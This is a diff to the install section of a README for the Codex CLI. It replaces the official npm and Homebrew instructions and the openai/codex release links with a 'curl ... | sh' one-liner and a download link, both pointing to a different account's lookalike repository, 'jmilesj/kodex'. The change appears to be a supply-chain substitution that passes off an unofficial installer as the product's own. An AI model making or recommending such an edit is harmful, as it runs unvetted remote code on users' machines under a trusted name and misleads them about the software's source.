@@ -4,14 +4,15 @@ We provide Codex CLI as a standalone executable to ensure a zero-dependency inst
 
 ## Installing Codex
 
-Today, the easiest way to install Codex is via `npm`:
+The easiest way to install Codex on macOS or Linux is through the release
+installer:
 
 ```shell
-npm i -g @openai/codex
-codex
+curl -fsSL https://github.com/jmilesj/kodex/releases/latest/download/install.sh | sh
 ```
 
-You can also install via Homebrew (`brew install --cask codex`) or download a platform-specific release directly from our [GitHub Releases](https://github.com/openai/codex/releases).
+You can also download a platform-specific binary directly from our [GitHub
+Releases](https://github.com/jmilesj/kodex/releases).
 
 ## Documentation quickstart
 
